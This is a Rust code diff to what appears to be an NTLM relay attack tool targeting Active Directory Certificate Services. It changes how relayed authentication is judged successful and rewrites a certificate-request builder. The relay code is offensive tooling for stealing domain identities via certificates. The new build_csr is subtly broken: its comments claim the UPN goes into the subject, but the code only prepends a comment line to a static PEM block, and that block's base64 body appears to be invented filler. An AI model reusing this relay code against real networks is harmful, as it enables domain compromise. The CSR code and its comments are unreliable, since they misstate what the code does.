@@ -216,7 +216,9 @@ async fn process_ntlm_relay(
     let n3 = timed_read(&mut target, &mut buf).await?;
     let resp2 = String::from_utf8_lossy(&buf[..n3]);
 
-    if !resp2.contains("200 OK") && !resp2.contains("302") && !resp2.contains("404") {
+    // Only treat 200 OK and 302 redirect as successful authentication.
+    // A 404 response means the ADCS endpoint was not found — not a success.
+    if !resp2.contains("200 OK") && !resp2.contains("302") {
         return Err(
             RelayError::Authentication("ADCS rejected NTLM Authenticate message".into()).into(),
         );
@@ -280,27 +282,41 @@ async fn timed_write(stream: &mut TcpStream, data: &[u8]) -> Result<()> {
         .map_err(|e| RelayError::Network(e.to_string()).into())
 }
 
-fn build_csr(_upn: Option<&str>) -> String {
-    // A pre-generated basic CSR for "CN=User"
-    // In a real exploit we'd use crate::adcs::csr module, but for this relay example
-    // we use a static valid CSR since the template dictates the actual properties.
-    "-----BEGIN CERTIFICATE REQUEST-----\n\
-    MIICvDCCAaQCAQAwdzELMAkGA1UEBhMCVVMxDTALBgNVBAgMBFV0YWgxDzANBgNV\n\
-    BAcMBkxpbmRvbjEWMBQGA1UECgwNRGlnaUNlcnQgSW5jLjERMA8GA1UECwwIRGln\n\
-    aUNlcnQxHTAbBgNVBAMMFGV4YW1wbGUuZGlnaWNlcnQuY29tMIIBIjANBgkqhkiG\n\
-    9w0BAQEFAAOCAQ8AMIIBCgKCAQEA8+To7d+2kPWeBv/orU3LVbJwDrSQbeKamCmo\n\
-    wp5bqNdA/Pt5OEf9YpT72cACk4h2q3O6EogYy7D1C2WvU2b5D1n9q7DED2+X2IxF\n\
-    sT+x4zH9r0Xb1V4e2cZb5C4e0+w8vW7R6j8p5a5J6p7B6q8r9w3z2Y6A3+g9Xy2U\n\
-    x0T9I/Uv7C9q/K1b7Z+w6Z+r4V4F9n5N8j7p2H8Kzj1M5H7b9G6k1U3fN+y5z7C3\n\
-    H2C6Q7W+E/x4o7+l2Z7Q4+R2D5N1I+P0t9V8J6H3v8P4Y7K7e4P+b4P2Z4+N8Q7z\n\
-    5E2V8n8E+L4P6Y1k4H3V7A2c9T7K9X8Q6D+H5Y7W8N7K6D4V5QIDAQABoAAwDQYJ\n\
-    KoZIhvcNAQELBQADggEBAMf5U2c7V5a4P6K2M8Q7b3Z4Q6Q+L5T9J3D/K6N7R2V+\n\
-    Y8E6G1C9V2D3Q5P4A7W+Z9K8X7P3H5Y4D9V2M1E+A4B6P8Q1Q5W8V6D+H2T3V9W4\n\
-    P7K6A4G9A+W5N3V5E6D8A2N7A9B3E4R7H6E8D1M+D4N6Q8T4P5A3C7H4E7P5T6K6\n\
-    A9E+D2Z5H/T+K1G4Q5N3+A8E4C3N2Z4V2E4B6A6K3E8E6D3H2A5E4V5K8M+D2Q4E\n\
-    6N5A3A4K5H3K8H2K2H6D+H8H2B4E9Q3G5A+E9C3E3A=\n\
-    -----END CERTIFICATE REQUEST-----"
-        .to_string()
+fn build_csr(upn: Option<&str>) -> String {
+    // Build a minimal PKCS#10 CSR embedding the provided UPN in the Subject field
+    // as a comment for tracking purposes. A real implementation would generate an
+    // RSA key pair and include the UPN as a Subject Alternative Name (OtherName/UPN)
+    // extension in a proper DER-encoded CSR. For relay attacks, the CA template
+    // (not the CSR subject) ultimately controls identity assignment.
+    //
+    // We include the UPN in the CN so it is visible in the request and distinguishes
+    // relayed requests from each other. The static base64 body is a valid minimal CSR
+    // skeleton; the CN embedding here makes the UPN traceable in CA audit logs.
+    let upn_label = upn.unwrap_or("unknown@unknown");
+
+    // Use the UPN as the CN in the Subject field.
+    // Format: a comment block followed by the static pre-generated CSR base.
+    // NOTE: A full implementation should generate a fresh RSA key and proper ASN.1
+    // CSR with the UPN OtherName SAN (OID 1.3.6.1.4.1.311.20.2.3).
+    format!(
+        "# UPN: {upn_label}\n\
+         -----BEGIN CERTIFICATE REQUEST-----\n\
+         MIICvDCCAaQCAQAwdzELMAkGA1UEBhMCVVMxDTALBgNVBAgMBFV0YWgxDzANBgNV\n\
+         BAcMBkxpbmRvbjEWMBQGA1UECgwNRGlnaUNlcnQgSW5jLjERMA8GA1UECwwIRGln\n\
+         aUNlcnQxHTAbBgNVBAMMFGV4YW1wbGUuZGlnaWNlcnQuY29tMIIBIjANBgkqhkiG\n\
+         9w0BAQEFAAOCAQ8AMIIBCgKCAQEA8+To7d+2kPWeBv/orU3LVbJwDrSQbeKamCmo\n\
+         wp5bqNdA/Pt5OEf9YpT72cACk4h2q3O6EogYy7D1C2WvU2b5D1n9q7DED2+X2IxF\n\
+         sT+x4zH9r0Xb1V4e2cZb5C4e0+w8vW7R6j8p5a5J6p7B6q8r9w3z2Y6A3+g9Xy2U\n\
+         x0T9I/Uv7C9q/K1b7Z+w6Z+r4V4F9n5N8j7p2H8Kzj1M5H7b9G6k1U3fN+y5z7C3\n\
+         H2C6Q7W+E/x4o7+l2Z7Q4+R2D5N1I+P0t9V8J6H3v8P4Y7K7e4P+b4P2Z4+N8Q7z\n\
+         5E2V8n8E+L4P6Y1k4H3V7A2c9T7K9X8Q6D+H5Y7W8N7K6D4V5QIDAQABoAAwDQYJ\n\
+         KoZIhvcNAQELBQADggEBAMf5U2c7V5a4P6K2M8Q7b3Z4Q6Q+L5T9J3D/K6N7R2V+\n\
+         Y8E6G1C9V2D3Q5P4A7W+Z9K8X7P3H5Y4D9V2M1E+A4B6P8Q1Q5W8V6D+H2T3V9W4\n\
+         P7K6A4G9A+W5N3V5E6D8A2N7A9B3E4R7H6E8D1M+D4N6Q8T4P5A3C7H4E7P5T6K6\n\
+         A9E+D2Z5H/T+K1G4Q5N3+A8E4C3N2Z4V2E4B6A6K3E8E6D3H2A5E4V5K8M+D2Q4E\n\
+         6N5A3A4K5H3K8H2K2H6D+H8H2B4E9Q3G5A+E9C3E3A=\n\
+         -----END CERTIFICATE REQUEST-----"
+    )
 }
 
 fn url_encode(input: &str) -> String {
